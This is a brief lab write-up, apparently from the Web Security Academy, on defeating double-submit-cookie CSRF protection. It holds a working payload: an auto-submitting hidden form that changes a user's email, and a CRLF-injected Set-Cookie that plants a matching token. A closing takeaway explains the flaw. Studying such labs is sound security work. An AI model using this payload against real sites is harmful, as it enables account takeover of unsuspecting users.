# CSRF Vulnerability - Double Submit

## Let generate some Payloads!

```php
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
	<input required type="hidden" name="csrf" value="something">
</form>
<img src="X.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=something" onerror="document.forms[0].submit()">
```

## Takeaway

- some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.
- When the subsequent request is validated, the application simply ***verifies*** that the token submitted in the request parameter ***matches the value submitted in the cookie. ***

- Make sure the body token is the same as the header token! 